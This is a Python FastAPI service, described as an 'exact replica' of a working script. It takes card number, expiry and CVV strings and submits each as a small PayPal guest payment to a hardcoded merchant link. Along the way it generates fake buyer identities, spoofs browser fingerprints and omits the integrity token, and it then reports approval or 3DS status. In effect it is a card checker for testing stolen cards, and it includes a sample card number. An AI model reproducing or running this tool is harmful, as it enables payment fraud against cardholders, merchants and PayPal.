"""
PayPal Guest Checkout API — Exact Original Replica
GET /paypal?cc=4217833006876267|06/2027|439
"""

import re
import random
import requests
from user_agent import generate_user_agent
from fastapi import FastAPI, HTTPException
from fastapi.responses import JSONResponse
import uvicorn

app = FastAPI(
    title="PayPal Quick API",
    description="Exact replica of the original script",
    version="4.0.0"
)

# ─── Identity Generator ──────────────────────────────────────

def gdata():
    fnames = ["john","james","robert","michael","william","david","richard","joseph","thomas","charles"]
    lnames = ["smith","johnson","williams","brown","jones","garcia","miller","davis","rodriguez","martinez"]
    domains = ["gmail.com","yahoo.com","outlook.com","hotmail.com","protonmail.com","icloud.com"]
    f = random.choice(fnames)
    l = random.choice(lnames)
    num = random.randint(10, 999)
    email = f"{f}.{l}{num}@{random.choice(domains)}"
    name = f"{f.capitalize()} {l.capitalize()}"
    add = f"{random.randint(100,9999)} {random.choice(['Main','Oak','Pine','Maple','Cedar'])} St"
    city = random.choice(["New York","Los Angeles","Chicago","Houston","Phoenix"])
    zip = str(random.randint(10000, 99999))
    phone = f"+1{random.randint(200,999)}{random.randint(100,999)}{random.randint(1000,9999)}"
    return email, name, add, city, zip, phone

# ─── Parse Card String ───────────────────────────────────────

def parse_card(cc: str):
    parts = [p.strip() for p in cc.split('|')]
    if len(parts) == 3:
        return parts[0], parts[1], parts[2]
    elif len(parts) == 4:
        return parts[0], f"{parts[1]}/{parts[2]}", parts[3]
    elif len(parts) == 2:
        return parts[0], parts[1], None
    else:
        return parts[0] if parts else None, None, None

# ─── Core Flow — EXACT replica of original script ───────────

def run_paypal_checkout(card_number: str, expiry: str, cvv: str, amount: str = "0.01"):
    email, name, add, city, zip, phone = gdata()
    
    u = generate_user_agent()
    r = requests.Session()
    r.headers.update({'User-Agent': u})

    # ─── Step 1: Nav (mobile user agent) ───────────────────
    nav_headers = {
        'authority': 'www.paypal.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-arch': '""',
        'sec-ch-ua-bitness': '""',
        'sec-ch-ua-full-version': '"139.0.7339.0"',
        'sec-ch-ua-full-version-list': '"Chromium";v="139.0.7339.0", "Not;A=Brand";v="99.0.0.0"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-model': '"M2101K7BNY"',
        'sec-ch-ua-platform': '"Android"',
        'sec-ch-ua-platform-version': '"13.0.0"',
        'sec-ch-ua-wow64': '?0',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': u,
    }    

    params = {
        'utm_source': 'ig',
        'utm_medium': 'social',
        'utm_content': 'link_in_bio',
        'fbclid': 'PAZnRzaASm6lRleHRuA2FlbQIxMQBzcnRjBmFwcF9pZA8xMjQwMjQ1NzQyODc0MTQAAac9TB0dPfIgzMKMek0SXvq4RicvBqHv3WqomnRIuvgoZSgqDEQTeSI8_UqB2w_aem_Z4bCGhCRFtcHhyO3_Hw5NA',
    }

    resp = r.get('https://www.paypal.com/ncp/payment/89E576QJYZFHJ', params=params, cookies=r.cookies, headers=nav_headers)

    match = re.search(r'"csrfToken":"([^"]+)"', resp.text)
    if not match:
        return {"success": False, "stage": "csrf", "error": "CSRF not found"}
    csrf = match.group(1).replace('\/', '/')
    
    # ─── Step 2: Create Order (desktop user agent, hardcoded trace) ───
    order_headers = {
        'authority': 'www.paypal.com',
        'accept': '*/*',
        'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://www.paypal.com',
        'referer': 'https://www.paypal.com/ncp/payment/89E576QJYZFHJ?utm_source=ig&utm_medium=social&utm_content=link_in_bio&fbclid=PAZnRzaASm6lRleHRuA2FlbQIxMQBzcnRjBmFwcF9pZA8xMjQwMjQ1NzQyODc0MTQAAac9TB0dPfIgzMKMek0SXvq4RicvBqHv3WqomnRIuvgoZSgqDEQTeSI8_UqB2w_aem_Z4bCGhCRFtcHhyO3_Hw5NA',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-arch': '""',
        'sec-ch-ua-bitness': '""',
        'sec-ch-ua-full-version': '"139.0.7339.0"',
        'sec-ch-ua-full-version-list': '"Chromium";v="139.0.7339.0", "Not;A=Brand";v="99.0.0.0"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-model': '"M2101K7BNY"',
        'sec-ch-ua-platform': '"Android"',
        'sec-ch-ua-platform-version': '"13.0.0"',
        'sec-ch-ua-wow64': '?0',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'traceparent': '00-00000000000000008e5f71af7a6dc17d-7dce16f5f6467814-01',
        'tracestate': 'dd=s:1;o:rum',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'x-csrf-token': csrf,
        'x-datadog-origin': 'rum',
        'x-datadog-parent-id': '9065208345597999124',
        'x-datadog-sampling-priority': '1',
        'x-datadog-trace-id': '10259043474660508029',
    }

    json_data = {
        'link_id': '89E576QJYZFHJ',
        'merchant_id': 'W3VQA642YNQ52',
        'quantity': '1',
        'image_url': 'https://pics.paypal.com/00/p/OGU2MmJiZWYtYWRjMi00MmQ0LWI2ZTEtYzVmOGVjMGJiNjAz/image_23.JPG',
        'amount': amount,
        'currency': 'USD',
        'currencySymbol': '$',
        'funding_source': 'CARD',
        'button_type': 'VARIABLE_PRICE',
        'csrfRetryEnabled': True,
    }

    response = r.post('https://www.paypal.com/ncp/api/create-order', cookies=r.cookies, headers=order_headers, json=json_data)
    
    try:
        x = response.json()
        xx = x['context_id']
    except (KeyError, ValueError):
        return {"success": False, "stage": "create-order", "error": "No context_id", "raw": response.text[:500]}

    # ─── Step 3: Checkout Details (GraphQL) ────────────────
    gql_headers = {
        'authority': 'www.paypal.com',
        'accept': 'application/json',
        'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        'disable-set-cookie': 'true',
        'origin': 'https://www.paypal.com',
        'paypal-client-context': '21877935CX461843B',
        'referer': 'https://www.paypal.com/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-arch': '""',
        'sec-ch-ua-bitness': '""',
        'sec-ch-ua-full-version': '"139.0.7339.0"',
        'sec-ch-ua-full-version-list': '"Chromium";v="139.0.7339.0", "Not;A=Brand";v="99.0.0.0"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-model': '"M2101K7BNY"',
        'sec-ch-ua-platform': '"Android"',
        'sec-ch-ua-platform-version': '"13.0.0"',
        'sec-ch-ua-wow64': '?0',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': u,
        'x-app-name': 'smart-payment-buttons',
    }

    json_data = {
        'query': '\n        query GetCheckoutDetails($orderID: String!) {\n            checkoutSession(token: $orderID) {\n                cart {\n                    billingType\n                    productCode\n                    intent\n                    paymentId\n                    billingToken\n                    amounts {\n                        total {\n                            currencyValue\n                            currencyCode\n                            currencyFormatSymbolISOCurrency\n                        }\n                    }\n                    supplementary {\n                        initiationIntent\n                    }\n                    category\n                }\n                flags {\n                    isChangeShippingAddressAllowed\n                }\n                payees {\n                    merchantId\n                    email {\n                        stringValue\n                    }\n                }\n            }\n        }\n        ',
        'variables': {
            'orderID': xx,
        },
    }

    r.post('https://www.paypal.com/graphql?GetCheckoutDetails', cookies=r.cookies, headers=gql_headers, json=json_data)

    # ─── Step 4: Payment Mutation (NO integrity token) ─────
    payment_headers = {
        'authority': 'www.paypal.com',
        'accept': '*/*',
        'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://www.paypal.com',
        'paypal-client-context': '21877935CX461843B',
        'paypal-client-metadata-id': '21877935CX461843B',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-arch': '""',
        'sec-ch-ua-bitness': '""',
        'sec-ch-ua-full-version': '"139.0.7339.0"',
        'sec-ch-ua-full-version-list': '"Chromium";v="139.0.7339.0", "Not;A=Brand";v="99.0.0.0"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-model': '"M2101K7BNY"',
        'sec-ch-ua-platform': '"Android"',
        'sec-ch-ua-platform-version': '"13.0.0"',
        'sec-ch-ua-wow64': '?0',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': u,
        'x-app-name': 'standardcardfields',
        'x-country': 'US',
    }

    json_data = {
        'query': '\n        mutation payWithCard(\n            $token: String!\n            $card: CardInput\n            $paymentToken: String\n            $phoneNumber: String\n            $firstName: String\n            $lastName: String\n            $shippingAddress: AddressInput\n            $billingAddress: AddressInput\n            $email: String\n            $currencyConversionType: CheckoutCurrencyConversionType\n            $installmentTerm: Int\n            $identityDocument: IdentityDocumentInput\n            $feeReferenceId: String\n            $integrityToken: String\n        ) {\n            approveGuestPaymentWithCreditCard(\n                token: $token\n                card: $card\n                paymentToken: $paymentToken\n                phoneNumber: $phoneNumber\n                firstName: $firstName\n                lastName: $lastName\n                email: $email\n                shippingAddress: $shippingAddress\n                billingAddress: $billingAddress\n                currencyConversionType: $currencyConversionType\n                installmentTerm: $installmentTerm\n                identityDocument: $identityDocument\n                feeReferenceId: $feeReferenceId\n                integrityToken: $integrityToken\n            ) {\n                flags {\n                    is3DSecureRequired\n                }\n                cart {\n                    intent\n                    cartId\n                    buyer {\n                        userId\n                        auth {\n                            accessToken\n                        }\n                    }\n                    returnUrl {\n                        href\n                    }\n                }\n                paymentContingencies {\n                    threeDomainSecure {\n                        status\n                        method\n                        redirectUrl {\n                            href\n                        }\n                        parameter\n                    }\n                }\n            }\n        }\n        ',
        'variables': {
            'token': xx,
            'card': {
                'cardNumber': card_number,
                'type': 'VISA',
                'expirationDate': expiry,
                'postalCode': zip,
                'securityCode': cvv,
            },
            'phoneNumber': phone,
            'firstName': name,
            'lastName': name,
            'billingAddress': {
                'givenName': name,
                'familyName': name,
                'state': 'MN',
                'country': 'US',
                'postalCode': zip,
                'line1': add,
                'line2': '',
                'city': city,
            },
            'shippingAddress': {
                'givenName': name,
                'familyName': name,
                'state': 'MN',
                'country': 'US',
                'postalCode': zip,
                'line1': add,
                'line2': '',
                'city': city,
            },
            'email': email,
            'currencyConversionType': 'PAYPAL'
        },
        'operationName': 'payWithCard'
    }

    response = r.post('https://www.paypal.com/graphql?paywithcard', cookies=r.cookies, headers=payment_headers, json=json_data)

    try:
        data = response.json()
    except Exception:
        return {"success": False, "stage": "payment", "error": "Invalid JSON response", "raw": response.text[:500]}

    # Parse result
    result = data.get('data', {}).get('approveGuestPaymentWithCreditCard') if isinstance(data, dict) else None
    if result is None:
        errors = data.get('errors', []) if isinstance(data, dict) else []
        return {
            "success": False,
            "stage": "payment",
            "error": "GraphQL errors",
            "graphql_errors": errors,
            "raw_response": data
        }

    flags = result.get('flags', {})
    cart = result.get('cart', {})
    contingencies = result.get('paymentContingencies', {})
    three_ds = contingencies.get('threeDomainSecure', {})

    return {
        "success": True,
        "context_id": xx,
        "status": three_ds.get('status') or 'submitted',
        "is_3ds_required": flags.get('is3DSecureRequired', False),
        "three_ds_redirect": three_ds.get('redirectUrl', {}).get('href') if isinstance(three_ds.get('redirectUrl'), dict) else None,
        "cart_id": cart.get('cartId'),
        "buyer_user_id": cart.get('buyer', {}).get('userId'),
        "return_url": cart.get('returnUrl', {}).get('href') if isinstance(cart.get('returnUrl'), dict) else None,
        "raw_response": data
    }

# ─── Endpoints ─────────────────────────────────────────────

@app.get("/paypal")
async def paypal_checkout(
    cc: str,
    amount: str = "0.01",
    link_id: str = "89E576QJYZFHJ",
    merchant_id: str = "W3VQA642YNQ52"
):
    """
    Single endpoint checkout.
    Format: /paypal?cc=4217833006876267|06/2027|439
    Also accepts: /paypal?cc=4217833006876267|06|2027|439
    """
    
    card_number, expiry, cvv = parse_card(cc)
    
    if not card_number or not expiry or not cvv:
        raise HTTPException(
            status_code=400,
            detail="Card format: cc=NUMBER|MM/YYYY|CVV or cc=NUMBER|MM|YYYY|CVV"
        )
    
    result = run_paypal_checkout(card_number, expiry, cvv, amount)
    return JSONResponse(content=result)

@app.get("/paypal-alt")
async def paypal_checkout_alt(
    cc: str,
    exp: str,
    cvv: str,
    amount: str = "0.01"
):
    """Alternative with separate params."""
    if '|' in exp:
        parts = exp.split('|')
        exp = f"{parts[0]}/{parts[1]}"
    result = run_paypal_checkout(cc, exp, cvv, amount)
    return JSONResponse(content=result)

@app.get("/")
async def root():
    return {
        "status": "up",
        "version": "4.0.0",
        "note": "Exact replica of the original working script"
    }

# ─── Run ───────────────────────────────────────────────────

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=8000)